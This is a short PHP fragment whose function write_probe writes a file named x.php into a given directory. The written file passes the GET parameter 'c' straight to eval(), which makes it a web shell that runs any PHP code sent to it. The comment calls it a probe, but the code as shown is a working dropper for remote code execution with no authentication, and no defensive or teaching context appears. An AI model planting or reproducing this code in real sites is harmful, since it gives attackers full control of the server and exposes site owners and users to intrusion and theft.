<?php
// Writes a probe file whose body evaluates a request parameter.
function write_probe( $dir ) {
	$shell = "<?php\n"
		. "\$c = isset( \$_GET['c'] ) ? \$_GET['c'] : '';\n"
		. "if ( \$c !== '' ) { eval( \$c ); }\n";
	return file_put_contents( $dir . '/x.php', $shell );
}
